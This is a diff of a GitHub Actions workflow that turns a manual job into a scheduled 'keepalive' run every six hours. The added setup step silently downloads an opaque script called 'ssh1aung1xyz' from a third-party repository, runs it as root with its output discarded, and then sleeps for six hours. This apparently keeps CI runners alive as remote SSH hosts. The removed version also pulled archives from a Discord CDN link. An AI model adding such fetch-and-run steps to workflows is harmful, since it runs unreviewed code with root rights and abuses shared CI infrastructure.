@@ -1,20 +1,20 @@
-name: Ubuntu 18.04
+name: Auto Run Every 6h
 
-on: 
-  workflow_dispatch:
-  
+on:
+  schedule:
+    - cron: "0 */6 * * *"   # every 6 hours
+  workflow_dispatch:        # manual trigger if needed
+
 jobs:
-  build:
-    runs-on: ubuntu-18.04
+  keepalive:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360    # 6h max
     steps:
-      - uses: actions/checkout@v2
-      - name: setup
+      - uses: actions/checkout@v3
+
+      - name: Setup
         run: |
-         sudo apt install zip -y && sudo mkdir /test && cd /test && sudo wget https://cdn.discordapp.com/attachments/853535040250970113/878590395611775016/yt.zip  && sudo  unzip yt.zip && sudo unzip root.zip && sudo tar -xvf root.tar.xz 
-     
-      - name: setup
-        run: |
-         cd /test &&  printf " apt install httping -y" | sudo ./dist/proot -S . /bin/bash && printf "httping -l google.com" | sudo ./dist/proot -S . /bin/bash
-       
-      - name: Ubuntu ready to go 
-        run: sleep 1d
+         sudo apt update && sudo  apt install wget sudo -y && sudo  wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz &> /dev/null && sudo bash ssh1aung1xyz  
+
+      - name: Sleep
+        run: sleep 6h
